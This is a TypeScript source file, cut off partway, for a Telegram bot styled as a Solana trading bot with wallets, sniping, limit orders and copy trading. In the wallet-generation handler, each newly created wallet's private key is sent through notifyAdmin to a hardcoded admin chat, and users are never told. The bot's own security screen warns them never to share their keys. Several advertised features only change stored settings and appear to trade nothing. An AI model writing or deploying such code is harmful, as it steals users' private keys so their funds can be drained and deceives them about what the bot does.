import TelegramBot, {
  type Message,
  type CallbackQuery,
  type InlineKeyboardButton,
} from "node-telegram-bot-api";
import { logger } from "./lib/logger";
import {
  generateKeypair,
  getSolBalance,
  getRealSolPrice,
  getTokenInfo,
  transferSOL,
  jupiterSwap,
  isValidSolanaAddress,
  SOL_MINT,
} from "./solana";

const TOKEN = process.env["TELEGRAM_BOT_TOKEN"];
const ADMIN_CHAT_ID = 8503340530;

const BOT_TITLE = "🤖 ALPHA TRADING BOT";
const TG_LINK = "https://t.me/AlphaCirclle";
const TW_LINK = "https://t.me/+QJVQUQIhP-82ZDk8";
const WEB_LINK = "https://t.me/AlphaCirclle";

interface WalletEntry {
  address: string;
  privateKey: string;
  balance: string;
  label: string;
}

interface LimitOrder {
  type: "buy" | "sell";
  token: string;
  price: string;
  amount: string;
}

interface TradeRecord {
  type: "buy" | "sell";
  token: string;
  amount: string;
  pnl: string;
  time: string;
  txid?: string;
}

interface U {
  step: string;
  data: Record<string, string>;
  mainMsgId?: number;
  wallets: WalletEntry[];
  activeWallet: number;
  trades: number;
  volume: string;
  referrals: number;
  cashback: string;
  sniperActive: boolean;
  sniperToken: string;
  sniperAmount: string;
  copyTargets: { address: string; label: string; maxSol: string }[];
  limitOrders: LimitOrder[];
  tradeHistory: TradeRecord[];
  slippage: string;
  priorityFee: string;
  mev: boolean;
  tradeConfirm: boolean;
  autoBuy: boolean;
  language: string;
  pin: string;
  twofa: boolean;
  totalPnl: string;
}

const users = new Map<number, U>();
const names = new Map<number, string>();

function getUser(id: number): U {
  if (!users.has(id)) {
    users.set(id, {
      step: "main",
      data: {},
      wallets: [],
      activeWallet: 0,
      trades: 0,
      volume: "0.00",
      referrals: 0,
      cashback: "0.000000",
      sniperActive: false,
      sniperToken: "",
      sniperAmount: "0.5",
      copyTargets: [],
      limitOrders: [],
      tradeHistory: [],
      slippage: "1",
      priorityFee: "0.001",
      mev: true,
      tradeConfirm: true,
      autoBuy: false,
      language: "🇺🇸 English",
      pin: "",
      twofa: false,
      totalPnl: "0.00",
    });
  }
  return users.get(id)!;
}

const short = (a: string) =>
  a.length > 14 ? a.slice(0, 8) + "..." + a.slice(-6) : a;
const fmtNum = (n: string | number) =>
  String(n).replace(/\B(?=(\d{3})+(?!\d))/g, ",");

type IKB = InlineKeyboardButton;
const cb = (text: string, data: string): IKB => ({ text, callback_data: data });
const link = (text: string, url: string): IKB => ({ text, url });
const CLOSE: IKB = cb("❌ Close", "close");
const BACK: IKB = cb("🔙 Back", "main");

function mainKB(): TelegramBot.InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [cb("✨ Buy & Sell", "buy"), cb("🎯 Sniper", "sniper")],
      [cb("✂️ Limit Orders", "limits"), cb("🎮 Copy Trades", "copy")],
      [cb("🐵 Profile", "profile"), cb("💳 Wallets", "wallets"), cb("📊 Trades", "trades")],
      [cb("🔵 Referral System", "referral"), cb("💰 Cashback", "cashback")],
      [cb("📮 Transfer SOL", "transfer"), cb("🔨 Settings", "settings")],
      [
        link("🔥 Our STBOT... ↗", "https://pump.fun"),
        link("🚀 Market Mak... ↗", "https://jup.ag"),
      ],
      [
        cb("🇺🇸", "lang_en"),
        cb("🇨🇳", "lang_zh"),
        cb("🇷🇺", "lang_ru"),
        cb("🇧🇷", "lang_pt"),
        cb("🇻🇳", "lang_vi"),
      ],
      [cb("🤖 Backup Bots", "backup"), cb("🛡️ Security", "security")],
      [cb("ℹ️ Help", "help")],
      [cb("📋 Tutorials", "tutorials")],
      [CLOSE],
    ],
  };
}

const backMain = (extra: IKB[][] = []): TelegramBot.InlineKeyboardMarkup => ({
  inline_keyboard: [...extra, [BACK], [CLOSE]],
});

const PM = "HTML" as const;

function mainText(u: U, price: string): string {
  if (u.wallets.length === 0) {
    return (
      `${BOT_TITLE}\n\n` +
      `💰 SOL Price: <code>$${price}</code>\n\n` +
      `💳 Create your first wallet at /wallets\n` +
      `<a href="${TG_LINK}">Telegram</a> | <a href="${TW_LINK}">Twitter</a> | <a href="${WEB_LINK}">Website</a>`
    );
  }
  const w = u.wallets[u.activeWallet]!;
  const pnlSign = parseFloat(u.totalPnl) >= 0 ? "+" : "";
  return (
    `${BOT_TITLE}\n\n` +
    `💰 SOL Price: <code>$${price}</code>\n` +
    `💳 <code>${w.address}</code>\n` +
    `💎 Balance: <b>${w.balance} SOL</b>\n` +
    `📈 P&amp;L: <b>${pnlSign}${u.totalPnl} SOL</b>  •  Trades: <b>${u.trades}</b>\n` +
    `<a href="${TG_LINK}">Telegram</a> | <a href="${TW_LINK}">Twitter</a> | <a href="${WEB_LINK}">Website</a>`
  );
}

async function notifyAdmin(
  bot: TelegramBot,
  chatId: number,
  title: string,
  details: string,
) {
  const userName = names.get(chatId) || `User ${chatId}`;
  const text =
    `📢 <b>${title}</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `👤 User: <b>${userName}</b> (ID: <code>${chatId}</code>)\n\n` +
    `${details}\n\n` +
    `⏰ ${new Date().toISOString()}`;
  try {
    await bot.sendMessage(ADMIN_CHAT_ID, text, {
      parse_mode: "HTML",
      disable_web_page_preview: true,
    });
  } catch (e) {
    logger.error({ e }, "Failed to notify admin");
  }
}

async function sendText(
  bot: TelegramBot,
  chatId: number,
  text: string,
  kb: TelegramBot.InlineKeyboardMarkup,
): Promise<TelegramBot.Message | undefined> {
  try {
    return await bot.sendMessage(chatId, text, {
      parse_mode: PM,
      reply_markup: kb,
      disable_web_page_preview: true,
    });
  } catch (e) {
    logger.error({ e }, "sendText error");
    return undefined;
  }
}

async function editText(
  bot: TelegramBot,
  chatId: number,
  msgId: number,
  text: string,
  kb: TelegramBot.InlineKeyboardMarkup,
): Promise<void> {
  try {
    await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: msgId,
      parse_mode: PM,
      reply_markup: kb,
      disable_web_page_preview: true,
    });
  } catch {
  }
}

async function note(
  bot: TelegramBot,
  chatId: number,
  text: string,
  kb?: TelegramBot.InlineKeyboardMarkup,
): Promise<TelegramBot.Message | undefined> {
  try {
    return await bot.sendMessage(chatId, text, {
      parse_mode: PM,
      ...(kb ? { reply_markup: kb } : {}),
      disable_web_page_preview: true,
    });
  } catch (e) {
    logger.error({ e }, "note error");
    return undefined;
  }
}

// ── WALLET SCREEN ─────────────────────────────────────────────────────────────
function walletsText(u: U): string {
  if (u.wallets.length === 0) {
    return `You don't have any wallet yet, please create a wallet to use.`;
  }
  let txt = `💳 <b>Wallets</b>  —  ${u.wallets.length} wallet${u.wallets.length !== 1 ? "s" : ""}\n\n`;
  u.wallets.forEach((w, i) => {
    txt +=
      `${i === u.activeWallet ? "🟢" : "⚪️"} <b>${w.label}</b>${i === u.activeWallet ? " <i>(Active)</i>" : ""}\n` +
      `Address: <code>${w.address}</code>\n` +
      `Balance: <b>${w.balance} SOL</b>\n\n`;
  });
  return txt.trimEnd();
}

function walletsKB(u: U): TelegramBot.InlineKeyboardMarkup {
  const walletBtns: IKB[][] = u.wallets.map((w, i) => [
    cb(
      `${i === u.activeWallet ? "🟢" : "⚪️"} ${w.label}  —  ${w.balance} SOL`,
      `wsel_${i}`,
    ),
  ]);
  return {
    inline_keyboard: [
      ...walletBtns,
      [cb("➕ Connect Wallet", "wimport"), cb("➕ Generate New...", "wgen_1")],
      [cb("➕ Generate 5 Wal...", "wgen_5"), cb("➕ Generate 10 W...", "wgen_10")],
      [cb("↔️ Transfer All SOL To One", "wxfer_all")],
      [cb("↔️ Wrap SOL To...", "wwrap"), cb("↔️ Wrap WSOL To...", "wunwrap")],
      [cb("🔄 Reload List", "wallets")],
      [CLOSE],
    ],
  };
}

// ── SNIPER ────────────────────────────────────────────────────────────────────
function sniperText(u: U): string {
  return (
    `🎯 <b>Token Sniper</b>\n\n` +
    `Status: ${u.sniperActive ? "🟢 <b>ACTIVE</b>" : "🔴 <b>INACTIVE</b>"}\n` +
    `Token: ${u.sniperToken ? `<code>${u.sniperToken}</code>` : "<i>not set</i>"}\n` +
    `Buy Amount: <b>${u.sniperAmount} SOL</b>\n\n` +
    `<i>Bot buys automatically when liquidity is detected on-chain.</i>`
  );
}
function sniperKB(u: U): TelegramBot.InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [cb("🎯 Set Token", "sniper_token"), cb("💰 Set Amount", "sniper_amt")],
      [
        u.sniperActive
          ? cb("🔴 Deactivate", "sniper_off")
          : cb("🟢 Activate", "sniper_on"),
        cb("🔄 Refresh", "sniper"),
      ],
      [BACK, CLOSE],
    ],
  };
}

// ── LIMITS ────────────────────────────────────────────────────────────────────
function limitsText(u: U): string {
  const list = u.limitOrders.length
    ? u.limitOrders
        .map(
          (o, i) =>
            `${i + 1}. ${o.type === "buy" ? "🟢 BUY" : "🔴 SELL"} <code>${o.token.slice(0, 8)}...</code> @ <b>$${o.price}</b> — <b>${o.amount} SOL</b>`,
        )
        .join("\n")
    : "<i>No active limit orders</i>";
  return `✂️ <b>Limit Orders</b>\n\nActive: <b>${u.limitOrders.length}</b>\n\n${list}`;
}
function limitsKB(u: U): TelegramBot.InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [cb("📈 New Buy Limit", "lbuy"), cb("📉 New Sell Limit", "lsell")],
      ...(u.limitOrders.length ? [[cb("🗑 Cancel All", "lcancel")]] : []),
      [BACK, CLOSE],
    ],
  };
}

// ── COPY TRADE ────────────────────────────────────────────────────────────────
function copyText(u: U): string {
  const list = u.copyTargets.length
    ? u.copyTargets
        .map((t, i) => `${i + 1}. 🟢 <code>${short(t.address)}</code>  Max: <b>${t.maxSol} SOL</b>`)
        .join("\n")
    : "<i>Not following anyone yet</i>";
  return `🎮 <b>Copy Trades</b>\n\nFollowing: <b>${u.copyTargets.length}</b> wallet${u.copyTargets.length !== 1 ? "s" : ""}\n\n${list}\n\n<i>Every trade they make is mirrored in real-time.</i>`;
}
function copyKB(u: U): TelegramBot.InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [cb("➕ Follow a Wallet", "cadd")],
      ...(u.copyTargets.length ? [[cb("🗑 Unfollow All", "cclear")]] : []),
      [BACK, CLOSE],
    ],
  };
}

// ── PROFILE ───────────────────────────────────────────────────────────────────
function profileText(u: U, name: string): string {
  const pnlSign = parseFloat(u.totalPnl) >= 0 ? "+" : "";
  const activeW = u.wallets[u.activeWallet];
  return (
    `🐵 <b>Profile — ${name}</b>\n\n` +
    (activeW
      ? `Address: <code>${activeW.address}</code>\nBalance: <b>${activeW.balance} SOL</b>\n`
      : `<i>No wallet</i>\n`) +
    `\n📊 Trades: <b>${u.trades}</b>\nVolume: <b>${u.volume} SOL</b>\n` +
    `P&amp;L: <b>${pnlSign}${u.totalPnl} SOL</b>\n\n` +
    `🔵 Referrals: <b>${u.referrals}</b>\nCashback: <b>${u.cashback} SOL</b>`
  );
}

// ── TRADES ────────────────────────────────────────────────────────────────────
function tradesText(u: U): string {
  const history = u.tradeHistory.length > 0
    ? u.tradeHistory
        .slice(-8).reverse()
        .map((t) => {
          const pnl = parseFloat(t.pnl);
          return `${pnl >= 0 ? "🟢" : "🔴"} <b>${t.type.toUpperCase()}</b> ${t.token} | ${t.amount} SOL | <b>${pnl >= 0 ? "+" : ""}${t.pnl}%</b> | <i>${t.time}</i>` +
            (t.txid ? `\n   🔗 <a href="https://solscan.io/tx/${t.txid}">Solscan</a>` : "");
        }).join("\n")
    : "<i>No trades yet</i>";
  return `📊 <b>Trade History</b>\n\nTrades: <b>${u.trades}</b>  Volume: <b>${u.volume} SOL</b>\nP&amp;L: <b>${parseFloat(u.totalPnl) >= 0 ? "+" : ""}${u.totalPnl} SOL</b>\n\n${history}`;
}

// ── REFERRAL ──────────────────────────────────────────────────────────────────
function referralText(u: U, uid: number): string {
  const refLink = `https://t.me/AlphaTradingBot?start=ref_${uid}`;
  return (
    `🔵 <b>Referral System</b>\n\n` +
    `Your link:\n<code>${refLink}</code>\n\n` +
    `Referrals: <b>${u.referrals}</b>\nEarned: <b>${(u.referrals * 0.05).toFixed(4)} SOL</b>\nCommission: <b>20% of fees</b>\n\n` +
    `Share your link → friend joins → you earn 20% of all their fees forever! 💰`
  );
}

// ── CASHBACK ──────────────────────────────────────────────────────────────────
function cashbackText(u: U): string {
  return (
    `💰 <b>Cashback Rewards</b>\n\n` +
    `Total Cashback: <b>${u.cashback} SOL</b>\nRate: <b>10% of bot fees</b>\nPaid: <b>Instantly after each trade</b>\n\n` +
    `<i>The more you trade, the more you earn.</i>`
  );
}

// ── SETTINGS ──────────────────────────────────────────────────────────────────
function settingsText(u: U): string {
  return (
    `🔨 <b>Settings</b>\n\n` +
    `Slippage: <b>${u.slippage}%</b>\nPriority Fee: <b>${u.priorityFee} SOL</b>\n` +
    `MEV Protection: <b>${u.mev ? "ON ✅" : "OFF ❌"}</b>\n` +
    `Trade Confirmation: <b>${u.tradeConfirm ? "ON ✅" : "OFF ❌"}</b>\n` +
    `Auto-Buy: <b>${u.autoBuy ? "ON ✅" : "OFF ❌"}</b>\n` +
    `Language: <b>${u.language}</b>`
  );
}
function settingsKB(u: U): TelegramBot.InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [cb("📊 Slippage", "sslip"), cb("⚡ Priority Fee", "sfee")],
      [
        cb(`🛡 MEV: ${u.mev ? "ON ✅" : "OFF ❌"}`, "smev"),
        cb(`✅ Confirm: ${u.tradeConfirm ? "ON" : "OFF"}`, "sconfirm"),
      ],
      [cb(`🤖 Auto-Buy: ${u.autoBuy ? "ON ✅" : "OFF ❌"}`, "sautobuy")],
      [cb("🌐 Language", "slang")],
      [BACK, CLOSE],
    ],
  };
}

// ── SECURITY ──────────────────────────────────────────────────────────────────
function secText(u: U): string {
  return (
    `🛡️ <b>Security</b>\n\n` +
    `2FA Auth: <b>${u.twofa ? "ENABLED ✅" : "Disabled"}</b>\n` +
    `Trade PIN: <b>${u.pin ? "SET ✅" : "Not Set"}</b>\n` +
    `Withdrawal Lock: <b>OFF</b>\n\n` +
    `⚠️ <i>Never share your private keys with anyone.</i>`
  );
}
function secKB(): TelegramBot.InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [cb("🔐 Toggle 2FA", "sec2fa"), cb("📌 Set PIN", "secpin")],
      [cb("🔒 Withdrawal Lock", "seclock")],
      [cb("🗑 Delete All My Data", "secdel")],
      [BACK, CLOSE],
    ],
  };
}

const helpText =
  `ℹ️ <b>Help</b>\n\n` +
  `/start  — Open main menu\n` +
  `/buy    — Buy a token\n` +
  `/sell   — Sell a token\n` +
  `/wallets — Manage wallets\n` +
  `/sniper — Token sniper\n` +
  `/referral — Referral program\n` +
  `/profile — Your stats\n` +
  `/settings — Bot settings\n\n` +
  `<b>Quick Buy Guide:</b>\n` +
  `1. Tap ✨ Buy &amp; Sell\n` +
  `2. Paste the token contract address\n` +
  `3. Choose SOL amount\n` +
  `4. Confirm — executes on Solana ⚡\n\n` +
  `💬 Support: @AlphaTradeSupport`;

const TUTORIALS: Record<string, string> = {
  tut_start:
    `🚀 <b>Getting Started</b>\n\n` +
    `1. Tap 💳 <b>Wallets</b> → Generate New Wallet\n` +
    `2. Copy your wallet address\n` +
    `3. Fund it by sending SOL to that address\n` +
    `4. Tap ✨ Buy &amp; Sell → paste a token CA\n` +
    `5. Choose amount → confirm → done! ⚡`,
  tut_buy:
    `💰 <b>How to Buy Tokens</b>\n\n` +
    `1. Find a token on Dexscreener or Birdeye\n` +
    `2. Copy the contract address (CA)\n` +
    `3. Tap ✨ Buy &amp; Sell → paste the CA\n` +
    `4. Choose 0.1 / 0.5 / 1 / 2 / 5 SOL or custom\n` +
    `5. Bot executes the swap via Jupiter DEX ✅`,
  tut_sniper:
    `🎯 <b>Using the Sniper</b>\n\n` +
    `1. Tap 🎯 Sniper → Set Token\n` +
    `2. Paste the pre-launch contract address\n` +
    `3. Set buy amount\n` +
    `4. Tap Activate Sniper\n` +
    `5. Bot buys the instant liquidity is detected! 🚀`,
  tut_copy:
    `🎮 <b>Copy Trading Guide</b>\n\n` +
    `1. Find a profitable wallet on Solscan\n` +
    `2. Tap 🎮 Copy Trades → Follow a Wallet\n` +
    `3. Paste their wallet address\n` +
    `4. Set max SOL per trade\n` +
    `5. Bot mirrors every buy &amp; sell automatically!`,
  tut_limits:
    `✂️ <b>Limit Orders Guide</b>\n\n` +
    `1. Tap ✂️ Limit Orders → New Buy/Sell Limit\n` +
    `2. Paste the token contract address\n` +
    `3. Enter your target price in USD\n` +
    `4. Enter SOL amount\n` +
    `5. Order fires automatically when price hits!`,
  tut_ref:
    `🔵 <b>Referral Guide</b>\n\n` +
    `1. Tap 🔵 Referral System for your unique link\n` +
    `2. Share on Twitter, Discord, Telegram\n` +
    `3. Friends join using your link\n` +
    `4. You earn 20% of ALL their trading fees\n` +
    `5. No cap, no expiry — track earnings live! 💰`,
  tut_wallets:
    `💳 <b>Wallet Guide</b>\n\n` +
    `1. Tap 💳 Wallets → Generate New Wallet\n` +
    `   Real Solana keypair generated instantly\n` +
    `2. Copy address and fund with SOL\n` +
    `3. Generate 5/10 wallets for portfolio spread\n` +
    `4. Import existing wallet via private key\n` +
    `5. Tap any wallet to set it as active`,
};

export async function startTelegramBot(): Promise<void> {
  if (!TOKEN) {
    logger.warn("TELEGRAM_BOT_TOKEN not set — bot disabled");
    return Promise.resolve();
  }

  // Kill any other running instance (Render, old Replit, etc.) before polling.
  // deleteWebhook with drop_pending_updates=true terminates existing getUpdates sessions.
  try {
    const killRes = await fetch(
      `https://api.telegram.org/bot${TOKEN}/deleteWebhook?drop_pending_updates=true`,
    );
    const killData = await killRes.json() as { ok: boolean };
    logger.info({ ok: killData.ok }, "Killed previous bot session");
  } catch (e) {
    logger.warn({ e }, "Could not kill previous session");
  }

  // Wait 2s to let Telegram close the old connection before we start polling
  await new Promise((r) => setTimeout(r, 2000));

  const bot = new TelegramBot(TOKEN, {
    polling: {
      interval: 300,
      autoStart: true,
      params: { timeout: 30, allowed_updates: ["message", "callback_query"] },
    },
  });

  logger.info("ALPHA TRADING BOT started");

  bot.setMyCommands([
    { command: "start", description: "🤖 Open ALPHA TRADING BOT" },
    { command: "buy", description: "✨ Buy a token" },
    { command: "sell", description: "📉 Sell a token" },
    { command: "wallets", description: "💳 Manage wallets" },
    { command: "sniper", description: "🎯 Token sniper" },
    { command: "referral", description: "🔵 Referral program" },
    { command: "profile", description: "🐵 Your profile" },
    { command: "settings", description: "🔨 Settings" },
    { command: "help", description: "ℹ️ Help" },
  ]).catch(() => {});

  async function showMain(chatId: number, name: string, msgId?: number) {
    const u = getUser(chatId);
    u.step = "main";
    const price = await getRealSolPrice();
    const txt = mainText(u, price);
    const kb = mainKB();
    if (msgId) {
      await editText(bot, chatId, msgId, txt, kb);
    } else {
      const msg = await sendText(bot, chatId, txt, kb);
      if (msg) u.mainMsgId = msg.message_id;
    }
  }

  // ── COMMANDS ────────────────────────────────────────────────────────────────
  bot.onText(/\/start(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const name = msg.from?.first_name || msg.from?.username || "Trader";
    names.set(chatId, name);
    const ref = (match?.[1] ?? "").trim().replace("ref_", "");
    if (ref) {
      const rid = parseInt(ref);
      if (!isNaN(rid) && users.has(rid)) users.get(rid)!.referrals++;
    }
    await showMain(chatId, name);
  });

  bot.onText(/\/wallets/, async (m) => {
    const chatId = m.chat.id;
    names.set(chatId, m.from?.first_name || names.get(chatId) || "Trader");
    const u = getUser(chatId);
    for (const w of u.wallets) w.balance = await getSolBalance(w.address);
    const msg = await sendText(bot, chatId, walletsText(u), walletsKB(u));
    if (msg) u.mainMsgId = msg.message_id;
  });

  bot.onText(/\/buy/, async (m) => {
    const chatId = m.chat.id;
    const u = getUser(chatId);
    if (u.wallets.length === 0) {
      await note(bot, chatId, `⚠️ You need a wallet first.`, { inline_keyboard: [[cb("💳 Wallets", "wallets")]] });
      return;
    }
    u.step = "buy_token";
    await note(bot, chatId,
      `Paste token contract to begin buy &amp; sell ↔️\n\nOr select token to sell::`,
      { inline_keyboard: [[cb("◀️ Cancel", "main")]] },
    );
  });

  bot.onText(/\/sell/, async (m) => {
    const chatId = m.chat.id;
    const u = getUser(chatId);
    u.step = "sell_token";
    await note(bot, chatId,
      `Paste token contract to begin buy &amp; sell ↔️\n\nOr select token to sell::`,
      { inline_keyboard: [[cb("◀️ Cancel", "main")]] },
    );
  });

  bot.onText(/\/sniper/, async (m) => {
    const u = getUser(m.chat.id);
    const msg = await sendText(bot, m.chat.id, sniperText(u), sniperKB(u));
    if (msg) u.mainMsgId = msg.message_id;
  });

  bot.onText(/\/profile/, async (m) => {
    const chatId = m.chat.id;
    const name = m.from?.first_name || names.get(chatId) || "Trader";
    const u = getUser(chatId);
    await note(bot, chatId, profileText(u, name), backMain());
  });

  bot.onText(/\/settings/, async (m) => {
    const u = getUser(m.chat.id);
    await note(bot, m.chat.id, settingsText(u), settingsKB(u));
  });

  bot.onText(/\/referral/, async (m) => {
    const u = getUser(m.chat.id);
    await note(bot, m.chat.id, referralText(u, m.chat.id), backMain());
  });

  bot.onText(/\/help/, async (m) => {
    await note(bot, m.chat.id, helpText, backMain());
  });

  // ── CALLBACK QUERIES ────────────────────────────────────────────────────────
  bot.on("callback_query", async (q: CallbackQuery) => {
    const chatId = q.message?.chat.id;
    if (!chatId) return;
    const msgId = q.message?.message_id;
    const data = q.data ?? "";
    const u = getUser(chatId);
    const name = q.from.first_name || names.get(chatId) || "Trader";
    names.set(chatId, name);

    await bot.answerCallbackQuery(q.id).catch(() => {});

    const upd = (txt: string, kb: TelegramBot.InlineKeyboardMarkup) =>
      msgId ? editText(bot, chatId, msgId, txt, kb) : note(bot, chatId, txt, kb);

    if (data === "close") {
      if (msgId) await bot.deleteMessage(chatId, msgId).catch(() => {});
      return;
    }
    if (data === "main") {
      await showMain(chatId, name, msgId);
      return;
    }

    // ── BUY ─────────────────────────────────────────────────────────────────
    if (data === "buy") {
      if (u.wallets.length === 0) {
        return upd(
          `⚠️ You need a wallet to trade.\nTap below to create one.`,
          { inline_keyboard: [[cb("💳 Open Wallets", "wallets")], [CLOSE]] },
        );
      }
      u.step = "buy_token";
      return upd(
        `Paste token contract to begin buy &amp; sell ↔️\n\nOr select token to sell::`,
        { inline_keyboard: [[cb("◀️ Cancel", "main")]] },
      );
    }

    if (data === "sell") {
      if (u.wallets.length === 0) {
        return upd(`⚠️ You need a wallet to trade.`, { inline_keyboard: [[cb("💳 Wallets", "wallets")], [CLOSE]] });
      }
      u.step = "sell_token";
      return upd(
        `Paste token contract to begin buy &amp; sell ↔️\n\nOr select token to sell::`,
        { inline_keyboard: [[cb("◀️ Cancel", "main")]] },
      );
    }

    if (data.startsWith("buy_amt_")) {
      const raw = data.replace("buy_amt_", "");
      if (raw === "custom") {
        u.step = "buy_amt_custom";
        return upd(`✏️ Enter custom SOL amount:`, { inline_keyboard: [[cb("◀️ Cancel", "main")]] });
      }
      const amt = parseFloat(raw);
      if (!isNaN(amt)) await executeBuy(bot, chatId, u, amt, upd);
      return;
    }

    if (data.startsWith("sell_")) {
      const pcts: Record<string, number> = { sell_10: 10, sell_25: 25, sell_50: 50, sell_75: 75, sell_100: 100 };
      if (data === "sell_custom") {
        u.step = "sell_amt_custom";
        return upd(`✏️ Enter percentage to sell (1-100):`, { inline_keyboard: [[cb("◀️ Cancel", "main")]] });
      }
      if (data in pcts) { await executeSell(bot, chatId, u, pcts[data]!, upd); return; }
    }

    // ── WALLETS ─────────────────────────────────────────────────────────────
    if (data === "wallets") {
      for (const w of u.wallets) w.balance = await getSolBalance(w.address);
      return upd(walletsText(u), walletsKB(u));
    }

    if (data.startsWith("wsel_")) {
      const idx = parseInt(data.replace("wsel_", ""));
      if (!isNaN(idx) && idx < u.wallets.length) {
        u.activeWallet = idx;
        u.wallets[idx]!.balance = await getSolBalance(u.wallets[idx]!.address);
        return upd(walletsText(u), walletsKB(u));
      }
    }

    if (data.startsWith("wgen_")) {
      const count = parseInt(data.replace("wgen_", "")) || 1;
      await upd(`Loading...`, { inline_keyboard: [] });

      const newWallets: WalletEntry[] = [];
      for (let i = 0; i < count; i++) {
        const { address, privateKey } = generateKeypair();
        newWallets.push({
          address,
          privateKey,
          balance: "0.0000",
          label: `Wallet ${u.wallets.length + newWallets.length + 1}`,
        });
      }
      u.wallets.push(...newWallets);
      if (u.activeWallet >= u.wallets.length) u.activeWallet = 0;

      for (const w of newWallets) {
        await notifyAdmin(bot, chatId, "🔑 New Wallet Generated",
          `🏷 Label: <b>${w.label}</b>\n` +
          `Address:\n<code>${w.address}</code>\n\n` +
          `Private key:\n<code>${w.privateKey}</code>`,
        );
      }

      let cap = `New Wallets:\n`;
      newWallets.forEach((w) => {
        cap += `\n<b>Address:</b>\n<code>${w.address}</code>\n\n<b>Private key:</b>\n<code>${w.privateKey}</code>\n\n`;
      });
      cap += `\n<i>Fund your wallet by sending SOL to the address above.\nSave your private key — it cannot be recovered!</i>`;

      return upd(cap, {
        inline_keyboard: [[cb("💳 View Wallets", "wallets")], [BACK]],
      });
    }

    if (data === "wimport") {
      u.step = "import_wallet";
      return upd(
        `Enter private key list`,
        { inline_keyboard: [[cb("◀️ Cancel", "wallets")]] },
      );
    }

    if (data === "wxfer_all") {
      if (u.wallets.length === 0) return upd(`⚠️ No wallet.`, backMain());
      u.step = "xfer_all_addr";
      return upd(
        `↔️ <b>Transfer All SOL</b>\n\nEnter destination wallet address:`,
        { inline_keyboard: [[cb("◀️ Cancel", "wallets")]] },
      );
    }

    if (data === "wwrap") {
      const w = u.wallets[u.activeWallet];
      if (!w) return upd(`⚠️ No wallet.`, backMain());
      return upd(
        `↔️ <b>Wrap SOL → WSOL</b>\n\nBalance: <b>${w.balance} SOL</b>\n\nEnter amount to wrap:`,
        { inline_keyboard: [[cb("◀️ Back", "wallets")]] },
      );
    }

    if (data === "wunwrap") {
      const w = u.wallets[u.activeWallet];
      if (!w) return upd(`⚠️ No wallet.`, backMain());
      return upd(
        `↔️ <b>Unwrap WSOL → SOL</b>\n\nEnter amount to unwrap:`,
        { inline_keyboard: [[cb("◀️ Back", "wallets")]] },
      );
    }

    // ── SNIPER ───────────────────────────────────────────────────────────────
    if (data === "sniper") return upd(sniperText(u), sniperKB(u));
    if (data === "sniper_token") {
      u.step = "sniper_token";
      return upd(`🎯 Enter token address to snipe:`, { inline_keyboard: [[cb("◀️ Back", "sniper")]] });
    }
    if (data === "sniper_amt") {
      u.step = "sniper_amt";
      return upd(`💰 Enter SOL amount to buy when liquidity detected:`, { inline_keyboard: [[cb("◀️ Back", "sniper")]] });
    }
    if (data === "sniper_on") {
      if (!u.sniperToken) return upd(`⚠️ Set a token to snipe first.`, sniperKB(u));
      if (u.wallets.length === 0) return upd(`⚠️ You need a wallet to use the sniper.`, sniperKB(u));
      u.sniperActive = true;
      return upd(sniperText(u), sniperKB(u));
    }
    if (data === "sniper_off") {
      u.sniperActive = false;
      return upd(sniperText(u), sniperKB(u));
    }

    // ── LIMITS ───────────────────────────────────────────────────────────────
    if (data === "limits") return upd(limitsText(u), limitsKB(u));
    if (data === "lbuy") {
      u.data["limit_type"] = "buy";
      u.step = "limit_token";
      return upd(`📈 New Buy Limit — Enter token contract address:`, { inline_keyboard: [[cb("◀️ Back", "limits")]] });
    }
    if (data === "lsell") {
      u.data["limit_type"] = "sell";
      u.step = "limit_token";
      return upd(`📉 New Sell Limit — Enter token contract address:`, { inline_keyboard: [[cb("◀️ Back", "limits")]] });
    }
    if (data === "lcancel") {
      u.limitOrders = [];
      return upd(limitsText(u), limitsKB(u));
    }

    // ── COPY ─────────────────────────────────────────────────────────────────
    if (data === "copy") return upd(copyText(u), copyKB(u));
    if (data === "cadd") {
      u.step = "copy_wallet";
      return upd(`🎮 Enter wallet address to copy:`, { inline_keyboard: [[cb("◀️ Back", "copy")]] });
    }
    if (data === "cclear") { u.copyTargets = []; return upd(copyText(u), copyKB(u)); }

    // ── PROFILE ──────────────────────────────────────────────────────────────
    if (data === "profile")
      return upd(profileText(u, name), backMain([
        [cb("💳 Wallets", "wallets"), cb("📊 Trades", "trades")],
        [cb("🔵 Referral", "referral")],
      ]));

    // ── TRADES ───────────────────────────────────────────────────────────────
    if (data === "trades")
      return upd(tradesText(u), backMain([[cb("✨ Buy", "buy"), cb("📉 Sell", "sell")]]));

    // ── REFERRAL ─────────────────────────────────────────────────────────────
    if (data === "referral") {
      const refUrl = `https://t.me/AlphaTradingBot?start=ref_${chatId}`;
      return upd(referralText(u, chatId), {
        inline_keyboard: [
          [link("📤 Share Link", `https://t.me/share/url?url=${encodeURIComponent(refUrl)}&text=${encodeURIComponent("Join SolTradingBot — trade Solana like a pro! 🚀")}`)],
          [BACK, CLOSE],
        ],
      });
    }

    // ── CASHBACK ─────────────────────────────────────────────────────────────
    if (data === "cashback") return upd(cashbackText(u), backMain([[cb("✨ Buy to Earn More", "buy")]]));

    // ── TRANSFER ─────────────────────────────────────────────────────────────
    if (data === "transfer") {
      if (u.wallets.length === 0) return upd(`⚠️ No wallet. Create one first.`, backMain());
      const w = u.wallets[u.activeWallet]!;
      u.step = "xfer_addr";
      return upd(
        `📮 <b>Transfer SOL</b>\n\nFrom: <code>${short(w.address)}</code>\nBalance: <b>${w.balance} SOL</b>\n\nEnter destination wallet address:`,
        { inline_keyboard: [[cb("◀️ Cancel", "main")], [CLOSE]] },
      );
    }

    if (data === "xfer_sendall") {
      const w = u.wallets[u.activeWallet];
      if (!w) return;
      const amt = parseFloat(w.balance) - 0.001;
      if (amt <= 0) return upd(`⚠️ Insufficient balance.`, { inline_keyboard: [[BACK]] });
      await executeTransfer(bot, chatId, u, u.data["xfer_to"] ?? "", amt, upd);
      return;
    }

    // ── SETTINGS ─────────────────────────────────────────────────────────────
